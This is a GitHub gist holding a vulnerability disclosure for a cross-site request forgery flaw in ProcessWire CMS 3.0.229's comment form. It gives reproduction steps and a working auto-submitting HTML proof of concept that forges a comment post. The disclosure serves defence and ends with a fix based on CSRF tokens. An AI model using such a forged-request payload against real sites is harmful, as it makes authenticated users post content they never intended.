
[Skip to content](#start-of-content)

[All gists](/discover)
[Back to GitHub](https://github.com)
[Sign in](https://gist.github.com/auth/github?return_to=https%3A%2F%2Fgist.github.com%2FDefensiumDevelopers%2F608be4d10b016dce0566925368a8b08c)
[Sign up](/join?return_to=https%3A%2F%2Fgist.github.com%2FDefensiumDevelopers%2F608be4d10b016dce0566925368a8b08c&source=header-gist)

[Sign in](https://gist.github.com/auth/github?return_to=https%3A%2F%2Fgist.github.com%2FDefensiumDevelopers%2F608be4d10b016dce0566925368a8b08c) [Sign up](/join?return_to=https%3A%2F%2Fgist.github.com%2FDefensiumDevelopers%2F608be4d10b016dce0566925368a8b08c&source=header-gist)

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

Instantly share code, notes, and snippets.

[![@DefensiumDevelopers](https://avatars.githubusercontent.com/u/173691534?s=64&v=4)](/DefensiumDevelopers)

# [DefensiumDevelopers](/DefensiumDevelopers)/**[CVE-2024-41597.md](/DefensiumDevelopers/608be4d10b016dce0566925368a8b08c)**

Last active
July 21, 2024 07:56

Show Gist options

* [Download ZIP](/DefensiumDevelopers/608be4d10b016dce0566925368a8b08c/archive/1336fa59a4450e1853b25ffda280f067ebd16cfc.zip)

* [Star
  (0)
  0](/login?return_to=https%3A%2F%2Fgist.github.com%2FDefensiumDevelopers%2F608be4d10b016dce0566925368a8b08c)You must be signed in to star a gist
* [Fork
  (0)
  0](/login?return_to=https%3A%2F%2Fgist.github.com%2FDefensiumDevelopers%2F608be4d10b016dce0566925368a8b08c)You must be signed in to fork a gist

* Embed

  + Embed
     Embed this gist in your website.
  + Share
     Copy sharable link for this gist.
  + Clone via HTTPS
     Clone using the web URL.
  + [Learn more about clone URLs](https://docs.github.com/articles/which-remote-url-should-i-use)

  Clone this repository at &lt;script src=&quot;https://gist.github.com/DefensiumDevelopers/608be4d10b016dce0566925368a8b08c.js&quot;&gt;&lt;/script&gt;
* Save DefensiumDevelopers/608be4d10b016dce0566925368a8b08c to your computer and use it in GitHub Desktop.

[Code](/DefensiumDevelopers/608be4d10b016dce0566925368a8b08c)
[Revisions
3](/DefensiumDevelopers/608be4d10b016dce0566925368a8b08c/revisions)

Embed

* Embed
   Embed this gist in your website.
* Share
   Copy sharable link for this gist.
* Clone via HTTPS
   Clone using the web URL.
* [Learn more about clone URLs](https://docs.github.com/articles/which-remote-url-should-i-use)

Clone this repository at &lt;script src=&quot;https://gist.github.com/DefensiumDevelopers/608be4d10b016dce0566925368a8b08c.js&quot;&gt;&lt;/script&gt;

Save DefensiumDevelopers/608be4d10b016dce0566925368a8b08c to your computer and use it in GitHub Desktop.

[Download ZIP](/DefensiumDevelopers/608be4d10b016dce0566925368a8b08c/archive/1336fa59a4450e1853b25ffda280f067ebd16cfc.zip)

CVE-2024-41597

 [Raw](/DefensiumDevelopers/608be4d10b016dce0566925368a8b08c/raw/1336fa59a4450e1853b25ffda280f067ebd16cfc/CVE-2024-41597.md)

[**CVE-2024-41597.md**](#file-cve-2024-41597-md)

# Cross-site Request Forgery (CSRF) vulnerability in the comments section of Processwire CMS 3.0.229

## Description of the vulnerability

```
Vulnerability Type              : Cross-site Request Forgery (CSRF).

Vulnerable Software Version     : Processwire CMS 3.0.229

Tested on                       : Windows 10  , Wamp server 3.3.5

Vulnerability location          : http://localhost/earth/  (Here earth is the page with    comments enabled)

```

### Vulnerability Details:

Cross-Site Request Forgery or CSRF is a security vulnerability that forces authenticated users to submit a request to the web application against which they are currently authenticated by exploiting the trust the web application has in an authenticated user.

## Impact of the Vulnerability

An attacker can induce a user to post comments on any of the pages which support comments using this vulnerability. Using this vulnerability he could trick the user into posting malicious content as comments which can affect the credibility of the user.

CSRFs can also damage the reputation of the website and its administrators. This vulnerability can also cause resource abuse as comment sections can trigger resource-intensive operations.

## Validation Steps

1. Either create an article and enable comments features or visit an article that has comments enabled in them.

   To add comments feature to your page if absent, you can do the following :

* Install the Comments fieldtype (FieldtypeComments ) from Admin > Modules menu
* Now go to Admin > Setup > Fields and create a new field. Select ‘Comments’ as the fieldtype and give it a name you wish maybe “comments ”.
* Next, you will see several options to configure, select that accordingly .
* Now in the php file for your newly created page add the following lines of code .

  Enter this where you want your comments to appear.

  **<?php echo $page->comments->render();**

  Enter this where you want the comments entry form to appear

  **<?php echo $page->comments->renderForm();**

  Thus the comments feature is added to your page.

2. Now turn on your burp proxy and submit a comment on the page .
3. Capture the request, remove the referrer header from the request and then generate a CSRF POC using the captured POST request .

An example of a POC is given below . Here the page that was created with the comments enabled is at the /earth endpoint

```
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="http://localhost/earth/" method="POST">
      <input type="hidden" name="cite" value="csrfbug" />
      <input type="hidden" name="email" value="testemail&#64;add&#46;com" />
      <input type="hidden" name="website" value="http&#58;&#47;&#47;aa&#46;com" />
      <input type="hidden" name="text" value="bug" />
      <input type="hidden" name="CommentForm&#95;submit" value="1" />
      <input type="hidden" name="page&#95;id" value="1026" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/');
      document.forms[0].submit();
    </script>
  </body>
</html>

```

4. Save this code snippet as an HTML file and open it.

Now a new comment has been posted on the page. An image indicating the same has been attached below.

[![CSRF_pic-poc](https://private-user-images.githubusercontent.com/173691534/350391661-4c5b29e4-4e95-4567-a296-9756f0461e0c.PNG?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MzY2MDkxNDMsIm5iZiI6MTczNjYwODg0MywicGF0aCI6Ii8xNzM2OTE1MzQvMzUwMzkxNjYxLTRjNWIyOWU0LTRlOTUtNDU2Ny1hMjk2LTk3NTZmMDQ2MWUwYy5QTkc_WC1BbXotQWxnb3JpdGhtPUFXUzQtSE1BQy1TSEEyNTYmWC1BbXotQ3JlZGVudGlhbD1BS0lBVkNPRFlMU0E1M1BRSzRaQSUyRjIwMjUwMTExJTJGdXMtZWFzdC0xJTJGczMlMkZhd3M0X3JlcXVlc3QmWC1BbXotRGF0ZT0yMDI1MDExMVQxNTIwNDNaJlgtQW16LUV4cGlyZXM9MzAwJlgtQW16LVNpZ25hdHVyZT00NWZiZGExNDFlMWMyMzg4MGY5OTY5Y2JiOWE1MzljMWQwYmZjM2I4OTM3YzcwZTlhZTE1NGIxYjM4NTI0MmFhJlgtQW16LVNpZ25lZEhlYWRlcnM9aG9zdCJ9.2u5vpdMvObE_nCW0vZvEqzcLjYDe-V7ytK-XDUzYd-A)](https://private-user-images.githubusercontent.com/173691534/350391661-4c5b29e4-4e95-4567-a296-9756f0461e0c.PNG?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MzY2MDkxNDMsIm5iZiI6MTczNjYwODg0MywicGF0aCI6Ii8xNzM2OTE1MzQvMzUwMzkxNjYxLTRjNWIyOWU0LTRlOTUtNDU2Ny1hMjk2LTk3NTZmMDQ2MWUwYy5QTkc_WC1BbXotQWxnb3JpdGhtPUFXUzQtSE1BQy1TSEEyNTYmWC1BbXotQ3JlZGVudGlhbD1BS0lBVkNPRFlMU0E1M1BRSzRaQSUyRjIwMjUwMTExJTJGdXMtZWFzdC0xJTJGczMlMkZhd3M0X3JlcXVlc3QmWC1BbXotRGF0ZT0yMDI1MDExMVQxNTIwNDNaJlgtQW16LUV4cGlyZXM9MzAwJlgtQW16LVNpZ25hdHVyZT00NWZiZGExNDFlMWMyMzg4MGY5OTY5Y2JiOWE1MzljMWQwYmZjM2I4OTM3YzcwZTlhZTE1NGIxYjM4NTI0MmFhJlgtQW16LVNpZ25lZEhlYWRlcnM9aG9zdCJ9.2u5vpdMvObE_nCW0vZvEqzcLjYDe-V7ytK-XDUzYd-A)

Thus an attacker can trick the user into commenting on pages with comments enabled by exploiting this vulnerability.

## Recommended Fix

CSRF tokens with significant entropy and are unpredictable, can be used with relevant requests to prevent CSRF vulnerability.

[![@xubom123](https://avatars.githubusercontent.com/u/175395956?s=80&v=4)](/xubom123)

Copy link

### **[xubom123](/xubom123)** commented [Jul 21, 2024](/DefensiumDevelopers/608be4d10b016dce0566925368a8b08c?permalink_comment_id=5128116#gistcomment-5128116)

Cmd

Sorry, something went wrong.

[![@xubom123](https://avatars.githubusercontent.com/u/175395956?s=80&v=4)](/xubom123)

Copy link

### **[xubom123](/xubom123)** commented [Jul 21, 2024](/DefensiumDevelopers/608be4d10b016dce0566925368a8b08c?permalink_comment_id=5128117#gistcomment-5128117)

Rsp

Sorry, something went wrong.

[![@xubom123](https://avatars.githubusercontent.com/u/175395956?s=80&v=4)](/xubom123)

Copy link

### **[xubom123](/xubom123)** commented [Jul 21, 2024](/DefensiumDevelopers/608be4d10b016dce0566925368a8b08c?permalink_comment_id=5128118#gistcomment-5128118)

Sol

Sorry, something went wrong.

[![@xubom123](https://avatars.githubusercontent.com/u/175395956?s=80&v=4)](/xubom123)

Copy link

### **[xubom123](/xubom123)** commented [Jul 21, 2024](/DefensiumDevelopers/608be4d10b016dce0566925368a8b08c?permalink_comment_id=5128120#gistcomment-5128120)

Gtl

Sorry, something went wrong.

[![@xubom123](https://avatars.githubusercontent.com/u/175395956?s=80&v=4)](/xubom123)

Copy link

### **[xubom123](/xubom123)** commented [Jul 21, 2024](/DefensiumDevelopers/608be4d10b016dce0566925368a8b08c?permalink_comment_id=5128121#gistcomment-5128121)

Phn

Sorry, something went wrong.

[Sign up for free](/join?source=comment-gist)
**to join this conversation on GitHub**.
Already have an account?
[Sign in to comment](/login?return_to=https%3A%2F%2Fgist.github.com%2FDefensiumDevelopers%2F608be4d10b016dce0566925368a8b08c)

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.

